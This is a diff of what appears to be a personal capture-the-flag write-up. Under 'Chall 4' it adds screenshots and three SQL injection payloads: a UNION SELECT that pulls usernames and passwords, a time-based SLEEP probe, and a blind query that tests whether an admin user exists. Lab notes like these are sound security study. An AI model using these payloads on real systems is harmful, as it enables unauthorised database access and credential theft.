@@ -156,4 +156,21 @@ FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/rigfw8y3wyo257buunoro1w1kb3g
 ```
 ## Chall 4
 
-https://oauth.tools/?ref=jwt_tools
+![[Pasted image 20251204174836.png]]
+
+```
+UNION SELECT username,password FROM users--
+```
+
+![[Pasted image 20251204175325.png]]
+
+```
+1 OR SLEEP(5)
+```
+
+```
+1 OR IF((SELECT COUNT(*) FROM user WHERE username='admin')>0, SLEEP(0.2), 0)
+```
+
+
+
